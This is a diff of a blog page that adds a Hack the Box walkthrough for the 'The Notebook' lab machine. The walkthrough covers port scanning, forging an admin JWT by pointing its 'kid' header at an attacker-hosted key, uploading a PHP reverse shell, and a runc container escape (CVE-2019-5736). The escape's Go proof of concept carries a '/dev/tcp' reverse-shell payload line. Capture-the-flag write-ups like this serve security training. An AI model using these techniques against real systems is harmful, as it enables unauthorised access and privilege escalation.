@@ -9,7 +9,9 @@
   <meta name="robots" content="all,follow">
   <meta name="googlebot" content="index,follow,snippet,archive">
   <meta property="og:title" content="Hack the Box - The Notebook" />
-<meta property="og:description" content="" />
+<meta property="og:description" content="OSINT  Nmap  The following nmap command was executed in order to obtain information about the machine:
+ nmap -p- -o nmap_output 10.129.124.15
+ Nmap scan report for thenotebook.htb (10.129.124.15) Host is up (0.037s latency). Not shown: 65532 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 10010/tcp filtered rxapi Based on the nmapout results, we see there is an uncommon service running on port 10010, called rxapi." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://adecenzo.github.io/posts/thenotebook/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-06-28T03:17:44-04:00" />
@@ -18,7 +20,9 @@
 
   <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Hack the Box - The Notebook"/>
-<meta name="twitter:description" content=""/>
+<meta name="twitter:description" content="OSINT  Nmap  The following nmap command was executed in order to obtain information about the machine:
+ nmap -p- -o nmap_output 10.129.124.15
+ Nmap scan report for thenotebook.htb (10.129.124.15) Host is up (0.037s latency). Not shown: 65532 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 10010/tcp filtered rxapi Based on the nmapout results, we see there is an uncommon service running on port 10010, called rxapi."/>
 
   
   
@@ -139,7 +143,7 @@
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fadecenzo.github.io%2fposts%2fthenotebook%2f&name=Hack%20the%20Box%20-%20The%20Notebook&description=" aria-label="Tumblr">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fadecenzo.github.io%2fposts%2fthenotebook%2f&name=Hack%20the%20Box%20-%20The%20Notebook&description=OSINT%20%20Nmap%20%20The%20following%20nmap%20command%20was%20executed%20in%20order%20to%20obtain%20information%20about%20the%20machine%3a%0a%20nmap%20-p-%20-o%20nmap_output%2010.129.124.15%0a%20Nmap%20scan%20report%20for%20thenotebook.htb%20%2810.129.124.15%29%20Host%20is%20up%20%280.037s%20latency%29.%20Not%20shown%3a%2065532%20closed%20ports%20PORT%20STATE%20SERVICE%2022%2ftcp%20open%20ssh%2080%2ftcp%20open%20http%2010010%2ftcp%20filtered%20rxapi%20Based%20on%20the%20nmapout%20results%2c%20we%20see%20there%20is%20an%20uncommon%20service%20running%20on%20port%2010010%2c%20called%20rxapi." aria-label="Tumblr">
       <i class="fab fa-tumblr " aria-hidden="true"></i>
     </a>
   </li>
@@ -152,7 +156,27 @@
 
     </div>
     <div id="toc">
-      <nav id="TableOfContents"></nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#osint">OSINT</a></li>
+    <li><a href="#findings">Findings</a>
+      <ul>
+        <li><a href="#header">Header</a></li>
+        <li><a href="#payload">Payload</a></li>
+        <li><a href="#signature">Signature</a></li>
+      </ul>
+    </li>
+    <li><a href="#generating-jwt-token">Generating JWT token</a>
+      <ul>
+        <li><a href="#header-1">Header</a></li>
+        <li><a href="#payload-1">Payload</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse-shell">Reverse Shell</a></li>
+    <li><a href="#user">User</a></li>
+    <li><a href="#root">Root</a></li>
+  </ul>
+</nav>
     </div>
   </span>
 </div>
@@ -190,7 +214,184 @@
 
   
     <div class="content" itemprop="articleBody">
-      
+      <h2 id="osint">OSINT</h2>
+<ul>
+<li>Nmap</li>
+</ul>
+<p>The following nmap command was executed in order to obtain information about the machine:</p>
+<blockquote>
+<p><strong>nmap -p- -o nmap_output 10.129.124.15</strong></p>
+</blockquote>
+<pre><code>Nmap scan report for thenotebook.htb (10.129.124.15)
+Host is up (0.037s latency).
+Not shown: 65532 closed ports
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+80/tcp    open     http
+10010/tcp filtered rxapi
+</code></pre><p>Based on the nmapout results, we see there is an uncommon service running on port <strong>10010</strong>, called <strong>rxapi</strong>.
+A google search for <strong>rxapi</strong> returns a result shows us that rxapi is a HTTP restful server, located <a href="https://www.npmjs.com/package/rxapi">here</a>.
+I messed with rxapi, and unfortunately it turned out to be a rabbit hole, so I decided to rethink my approach.</p>
+<ul>
+<li>Enumeration</li>
+</ul>
+<p>I revisited the website and registered a new account. With the new account, we can create notes and view those notes. I noticed when I created my new note, it had an id of 5. Because of this, I decided to access the notes with id of 1, 2, 3, and 4. I did not have the permissions to view those notes. Because of this enumeration,
+I know there is an existing account, most likely an admin, that posted notes.</p>
+<hr>
+<h2 id="findings">Findings</h2>
+<p>Based on what I found from the OSINT steps, I decided to see how the website handles authentication and found in the user&rsquo;s cookies the following:</p>
+<pre><code>auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRlc3QyIiwiZW1haWwiOiJ0ZXN0QG5iLmh0YiIsImFkbWluX2NhcCI6MH0.aNZKP0dtVbMMwGmqTCso4I2TvuyX3iXV9kMLkhhHzILHcS7f4mwih-UnHjrFdr1o2HSHYhH6d0pQhy9cS5ynO4_MWKPlP9zU_VQozCBsUn630UiTOBa6lnHjrdvH-jhI2ZmOIAOfC6MbR3TxTN479ryOj5XUYNG2ERcQDnXFooQHLntSEG1r_mvG6b1XedzqLx3npsKZgerRTWph7u0rS3AksIPe10siypdNBNe0MY_Sg1fOZgs-JqbQpNukCVhET6pJJUoKid1SZ6v-iia8TH_55JqZInAs0YMkwBQ6QXbDLX_9MaESyLaZkr9QYGS3WjU37i0HkvxXYEjwpN6cFRgR79P9qK-GUEJ-pLdUy4d7bFhJpsq90t4t9gmj1L-RJcYfMp_c6mpfYPYfwOpba1Z1CJ-nz1l6NtPk-j8BYsJECCvdxMOil859qAh3xcLY57LKMuJWl4X2xIOBNFEi1xbAtBhF0crO4Jxnhxp2ZO9WoyneFhi4mshpuJ6h8cdqXOiYBfMRvqTo0ZUJz8W3WYLCVjTAdskRZ3QWuxKXSk_QTgu1szDEtcCdhakwOMvtDdLdpUVsxwThUI2wRZJQTzezG86lQ1ckEcIyjWnq7FazyL9eTeC77u9M8kbFkiDx7n6S0QqOcjVVXJJL-9VgDGWeQkuQOqt6ZPxmTz2_N_k
+
+uuid=aeae1e58-802f-422c-a5f6-6e5adc5f7ec3
+</code></pre><p>The auth field is a <strong>JWT</strong> token, and we know since it&rsquo;s divided into three sections, separated by dots.
+I visited the JWT&rsquo;s official website, <a href="https://jwt.io/introduction">here</a>. Based at the current design,
+JWT&rsquo;s three sections are:</p>
+<ol>
+<li>Header</li>
+<li>Payload</li>
+<li>Signature</li>
+</ol>
+<p>Once we decode the JWT token, we get the following output:</p>
+<h3 id="header">Header</h3>
+<pre><code>{
+  &quot;typ&quot;: &quot;JWT&quot;,
+  &quot;alg&quot;: &quot;RS256&quot;,
+  &quot;kid&quot;: &quot;http://localhost:7070/privKey.key&quot;
+}
+</code></pre><h3 id="payload">Payload</h3>
+<pre><code>{
+  &quot;username&quot;: &quot;test2&quot;,
+  &quot;email&quot;: &quot;test@nb.htb&quot;,
+  &quot;admin_cap&quot;: 0
+}
+</code></pre><h3 id="signature">Signature</h3>
+<pre><code>RSASHA256(
+  base64UrlEncode(header) + &quot;.&quot; +
+  base64UrlEncode(payload),
+  public_key,
+  private_key
+  )
+</code></pre><p>Based on the header and payload data, it&rsquo;s clear we can exploit this. We see the algorithm used is <strong>RS256</strong>, the server
+signs the JWT token with a private key on a local server, and an <strong>admin_cap</strong> field that we can modify.</p>
+<h2 id="generating-jwt-token">Generating JWT token</h2>
+<p>In short, this is how the process will go:</p>
+<ol>
+<li>Generate RS256 public/private key pair</li>
+<li>Modify admin_cap and kid value</li>
+<li>Run a local web server</li>
+</ol>
+<p>I generated a RS256 public/private key pair with <strong>ssh-keygen</strong> by running the commands in sequence:</p>
+<pre><code>ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
+openssl rsa -in privKey.key -pubout -outform PEM -out public.key.pub
+</code></pre><p>Now, we need to modify the header and payload data to the following so we can exploit it.
+We will do this by modifying the <strong>kid</strong> value that points to our local server and the <strong>admin_cap</strong> to <strong>1</strong>.</p>
+<h3 id="header-1">Header</h3>
+<pre><code>{
+  &quot;typ&quot;: &quot;JWT&quot;,
+  &quot;alg&quot;: &quot;RS256&quot;,
+  &quot;kid&quot;: &quot;http://10.10.X.X:7070/privKey.key&quot;
+}
+</code></pre><h3 id="payload-1">Payload</h3>
+<pre><code>{
+  &quot;username&quot;: &quot;test2&quot;,
+  &quot;email&quot;: &quot;test@local.htb&quot;,
+  &quot;admin_cap&quot;: 1
+}
+
+</code></pre><p>To generate our newly signed JWT token we can use, we will write a python script.</p>
+<pre><code>import jwt
+
+public_key = &quot;&quot;
+
+private_key = &quot;&quot;
+
+
+payload = {&quot;username&quot;:&quot;test2&quot;,&quot;email&quot;:&quot;test@local.htb&quot;,&quot;admin_cap&quot;: 1}
+token = jwt.encode(payload,private_key,algorithm='RS256',headers={&quot;kid&quot;: &quot;http://10.10.X.X:7070/privKey.key&quot;})
+
+print(token)
+
+</code></pre><p>Take this token and replace the auth field in Cookie Manager.</p>
+<p>Refresh the page, we can see we are now an admin.</p>
+<h2 id="reverse-shell">Reverse Shell</h2>
+<p>The first note says there is a problem with the server that executes PHP scripts. This
+is a hint that we will need to use a PHP reverse shell.</p>
+<p>Start netcat with the following:</p>
+<blockquote>
+<p><strong>nc -nvlp 5050</strong></p>
+</blockquote>
+<p>Create a PHP reverse shell with your IP and port.</p>
+<p>Upload the file then visit the PHP file. Now we see that we get a reverse shell as the web user.</p>
+<h2 id="user">User</h2>
+<p>After some enumeration, we see there is a backup folder named <strong>backups</strong>.</p>
+<p>Navigate to the backups folder and notice a home.tar.gz file.</p>
+<p>Extract this file to the /tmp directory using the command:</p>
+<blockquote>
+<p><strong>tar -xf home.tar.gz -C /tmp</strong></p>
+</blockquote>
+<p>We learn of the user&rsquo;s name, <strong>noah</strong>.</p>
+<p>Inside of noah&rsquo;s directory, we find noah&rsquo;s SSH private key.</p>
+<p>Save this private key, and connect to noah&rsquo;s account via SSH using the command:</p>
+<blockquote>
+<p><strong>ssh -i id_rsa_noah <a href="mailto:noah@X.X.X.X">noah@X.X.X.X</a></strong></p>
+</blockquote>
+<p>As always, the user flag is located in ~/user.txt and now we can read the file contents.</p>
+<h2 id="root">Root</h2>
+<p>At this point, we need to enumerate the system for possible attack vectors. We will
+use linpeas to help us in this.</p>
+<p>The results of linpeas reveal the web application is running in a <strong>Docker</strong> container and
+that the system has <strong>runc</strong>. <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> It also revealed that we can run the following command
+with root privileges:</p>
+<blockquote>
+<p><strong>/usr/bin/docker exec -it webapp-dev01</strong></p>
+</blockquote>
+<p>After googling, we find a proof of concept of this CVE at <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">this</a> github repository.</p>
+<p>Modify the <strong>payload</strong> variable to the appropriate information for your machine.
+Example:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+
+<span style="color:#75715e">// Implementation of CVE-2019-5736
+</span><span style="color:#75715e">// Created with help from @singe, @_cablethief, and @feexd.
+</span><span style="color:#75715e">// This commit also helped a ton to understand the vuln
+</span><span style="color:#75715e">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
+</span><span style="color:#75715e"></span><span style="color:#f92672">import</span> (
+	<span style="color:#e6db74">&#34;fmt&#34;</span>
+	<span style="color:#e6db74">&#34;io/ioutil&#34;</span>
+	<span style="color:#e6db74">&#34;os&#34;</span>
+	<span style="color:#e6db74">&#34;strconv&#34;</span>
+	<span style="color:#e6db74">&#34;strings&#34;</span>
+)
+
+<span style="color:#75715e">// This is the line of shell commands that will execute on the host
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">payload</span> = <span style="color:#e6db74">&#34;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/10.10.X.X/5050 0&gt;&amp;1&#34;</span>
+
+<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+	<span style="color:#75715e">// First we overwrite /bin/sh with the /proc/self/exe interpreter path
+</span><span style="color:#75715e"></span>	<span style="color:#a6e22e">fd</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Create</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">err</span>)
+		<span style="color:#66d9ef">return</span>
+	}
+
+	<span style="color:#a6e22e">the</span> <span style="color:#a6e22e">rest</span> <span style="color:#a6e22e">of</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">script</span> <span style="color:#a6e22e">remains</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">same</span>
+}
+</code></pre></div><p>Spawn a separate shell for noah.</p>
+<p>Upload the <strong>Go exploit</strong> to the /tmp directory and run it.</p>
+<p>After running the exploit, run the command:</p>
+<blockquote>
+<p><strong>sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh</strong></p>
+</blockquote>
+<p>We are now root and read the root flag.</p>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p><strong>RunC</strong> is a container runtime software that is used primarily for
+spawning and running docker containers. A more thorough explanation of why <strong>runc</strong> is vulnerable, in this case, can be found <a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">here</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+
     </div>
   </article>
 
@@ -219,7 +420,27 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <nav id="TableOfContents"></nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#osint">OSINT</a></li>
+    <li><a href="#findings">Findings</a>
+      <ul>
+        <li><a href="#header">Header</a></li>
+        <li><a href="#payload">Payload</a></li>
+        <li><a href="#signature">Signature</a></li>
+      </ul>
+    </li>
+    <li><a href="#generating-jwt-token">Generating JWT token</a>
+      <ul>
+        <li><a href="#header-1">Header</a></li>
+        <li><a href="#payload-1">Payload</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse-shell">Reverse Shell</a></li>
+    <li><a href="#user">User</a></li>
+    <li><a href="#root">Root</a></li>
+  </ul>
+</nav>
     </div>
 
     <div id="share-footer" style="display: none">
@@ -266,7 +487,7 @@
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fadecenzo.github.io%2fposts%2fthenotebook%2f&name=Hack%20the%20Box%20-%20The%20Notebook&description=" aria-label="Tumblr">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fadecenzo.github.io%2fposts%2fthenotebook%2f&name=Hack%20the%20Box%20-%20The%20Notebook&description=OSINT%20%20Nmap%20%20The%20following%20nmap%20command%20was%20executed%20in%20order%20to%20obtain%20information%20about%20the%20machine%3a%0a%20nmap%20-p-%20-o%20nmap_output%2010.129.124.15%0a%20Nmap%20scan%20report%20for%20thenotebook.htb%20%2810.129.124.15%29%20Host%20is%20up%20%280.037s%20latency%29.%20Not%20shown%3a%2065532%20closed%20ports%20PORT%20STATE%20SERVICE%2022%2ftcp%20open%20ssh%2080%2ftcp%20open%20http%2010010%2ftcp%20filtered%20rxapi%20Based%20on%20the%20nmapout%20results%2c%20we%20see%20there%20is%20an%20uncommon%20service%20running%20on%20port%2010010%2c%20called%20rxapi." aria-label="Tumblr">
       <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
     </a>
   </li>
